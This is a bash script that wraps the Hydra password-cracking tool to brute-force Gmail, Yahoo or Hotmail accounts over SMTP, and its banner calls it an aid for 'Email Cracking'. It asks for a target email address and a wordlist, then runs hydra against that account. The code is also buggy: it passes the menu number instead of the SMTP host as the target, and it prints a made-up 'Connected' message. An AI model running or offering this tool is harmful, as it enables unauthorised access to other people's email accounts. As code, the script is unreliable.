#!/bin/bash


##################################################################################
#                                                                                #
#        Developed By Harbeed                                                    #
#                                                                                #
#          This is my first bash script :)                                       #
#                                                                                #
#                                                                                #
#                                                                                #
#                    https://github.com/FaisalHarbeed                            #
##################################################################################





    sleep 1.0;



cowsay -f tux EBF-HARBEED


printf "      \e[31m !!This Script is Only Help You To Use Hydra Tool For Email Cracking!! \n \n \n"



printf "\e[39m \e[1m ------------------------------\e[36m Developed By Harbeed \e[39m------------------------------ \n \n \n"

sleep 2.5;


 
show_menu(){
    normal=`echo "\033[m"`
    menu=`echo "\033[36m"` #Blue
    number=`echo "\033[33m"` #yellow
    bgred=`echo "\033[41m"`
    fgred=`echo "\033[31m"`
    printf "\n${menu}*********************************************${normal}\n"
    printf "${menu}**${number} 1)${menu} Gmail ${normal}\n"
    printf "${menu}**${number} 2)${menu} Yahoo ${normal}\n"
    printf "${menu}**${number} 3)${menu} Hotmail ${normal}\n"
    printf "${menu}*********************************************${normal}\n"
    printf "Please enter a menu option and enter or ${fgred}x to exit. ${normal}"
}

option_picked(){
    msgcolor=`echo "\033[01;31m"` # bold red
    normal=`echo "\033[00;00m"` # normal white
    message=${@:-"${normal}Error: No message passed"}
    printf "${msgcolor}${message}${normal}\n"
}

clear
show_menu


        read -r smtp


      case $smtp in
        1) clear;
            option_picked "Gmail \e[8m = smtp.gmail.com \e[28m";
            show_menu;
        ;;
        2) clear;
            option_picked "Yahoo \e[8m = smtp.mail.yahoo.com \e[28m";
            show_menu;
        ;;
        3) clear;
            option_picked "Hotmail \e[8m = smtp.live.com \e[28m";
            show_menu;
        ;;
        x) exit;
        ;;
        \n)exit;
        ;;
      esac
    


sleep 1.0;

clear;
printf " \nEnter Email Address: " 
read -r email

sleep 1.0;

clear;
printf "\n Wordlist: "
read -r wordlist

sleep 1.0;

clear
printf "\n Wait a moment please! \n \n"

sleep 1.8;

clear;
printf "\n \e[92m Connected \e[39m \n \n \n"

sleep 1.8;

clear
hydra -S -l "$email" -P "$wordlist" -e ns -V -s 465 "$smtp" smtp



